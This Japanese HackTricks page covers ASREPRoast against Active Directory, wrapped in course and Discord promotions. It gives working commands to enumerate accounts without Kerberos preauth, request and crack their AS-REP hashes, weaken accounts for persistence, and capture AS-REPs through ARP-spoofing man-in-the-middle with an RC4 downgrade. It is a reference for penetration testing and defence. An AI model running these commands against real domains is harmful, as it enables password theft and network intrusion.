# ASREPRoast

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローする。
- **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、**ハッキングトリックを共有**してください。

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)サーバーに参加して、経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取りましょう！

**ハッキングの洞察**\
ハッキングのスリルとチャレンジに深く入り込むコンテンツに参加しましょう

**リアルタイムハックニュース**\
リアルタイムのニュースと洞察を通じて、ハッキングの世界の速報を追いかけましょう

**最新の発表**\
最新のバグバウンティの開始や重要なプラットフォームの更新情報を把握しましょう

**[Discord](https://discord.com/invite/N3FrSbmwdy)**に参加して、今日からトップハッカーと協力しましょう！

## ASREPRoast

ASREPRoastは、**Kerberos事前認証が必要な属性**を持たないユーザーを標的とするセキュリティ攻撃です。基本的に、この脆弱性により、攻撃者はユーザーのパスワードを必要とせずに、ドメインコントローラー（DC）からユーザーの認証をリクエストできます。その後、DCは、ユーザーのパスワード由来のキーで暗号化されたメッセージで応答し、攻撃者はオフラインでユーザーのパスワードを特定するためにクラックを試みることができます。

この攻撃の主な要件は次のとおりです：
- **Kerberos事前認証の不足**：標的となるユーザーは、このセキュリティ機能が有効になっていない必要があります。
- **ドメインコントローラー（DC）への接続**：攻撃者は、リクエストを送信し、暗号化されたメッセージを受信するためにDCへのアクセスが必要です。
- **オプションのドメインアカウント**：ドメインアカウントを持っていると、LDAPクエリを使用して脆弱なユーザーを効率的に特定できます。このようなアカウントがない場合、攻撃者はユーザー名を推測する必要があります。


#### 脆弱なユーザーの列挙（ドメイン資格情報が必要）

{% code title="Windowsを使用する" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Linuxを使用する" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REPメッセージのリクエスト

{% code title="Linuxを使用する" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Windowsを使用する" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
Rubeusを使用したAS-REP Roastingは、暗号化タイプが0x17で事前認証タイプが0の4768を生成します。
{% endhint %}

### クラッキング
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### 持続性

**GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーに対して **preauth** を必要としないように強制します：

{% code title="Windows を使用する" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Linuxを使用する" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## 資格情報なしでのASreproast
Kerberosの事前認証が不要なユーザーの知識がない場合、攻撃者は中間者攻撃を使用してネットワークを通過するAS-REPパケットをキャプチャできます。<br>
[ASrepCatcher](https://github.com/Yaxxine7/ASrepCatcher)を使用すると、これが可能です。さらに、このツールはKerberosの交渉を変更することで、クライアントワークステーションにRC4を使用させることができます。
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher.py relay -dc $DC_IP --keep-spoofing

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher.py relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASrepCatcher.py listen
```
## 参考文献

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加して、経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取りましょう！

**ハッキングの洞察**\
ハッキングのスリルとチャレンジに深く入り込むコンテンツに参加しましょう

**リアルタイムハックニュース**\
リアルタイムのニュースと洞察を通じて、ハッキングの世界を追いかけましょう

**最新の発表**\
最新のバグバウンティの開始や重要なプラットフォームの更新情報を把握しましょう

**[Discord](https://discord.com/invite/N3FrSbmwdy)** に参加して、今日からトップハッカーと協力を始めましょう！

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)** でゼロからヒーローまでAWSハッキングを学びましょう！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい場合** は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションを発見する
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) をフォローする
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出して、あなたのハッキングトリックを共有する

</details>
